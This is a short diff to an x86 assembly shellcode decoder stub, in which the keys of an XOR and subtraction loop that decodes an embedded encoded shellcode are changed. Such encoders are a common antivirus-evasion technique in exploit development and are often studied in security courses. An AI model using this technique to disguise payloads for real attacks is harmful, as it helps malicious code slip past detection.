@@ -16,10 +16,10 @@ section .text write progbits
         je encodedShellcode
         
         ; decode
-        xor byte [eax], 0x56
-        sub byte [eax], 0x39
-        xor byte [eax], 0x42
-        xor byte [eax], 0x16
+        xor byte [eax], 0x39
+        sub byte [eax], 0x13
+        xor byte [eax], 0x7
+        xor byte [eax], 0xF
         
         inc eax                 ; point eax to the next encoded byte in encodedShellcode
         inc ecx
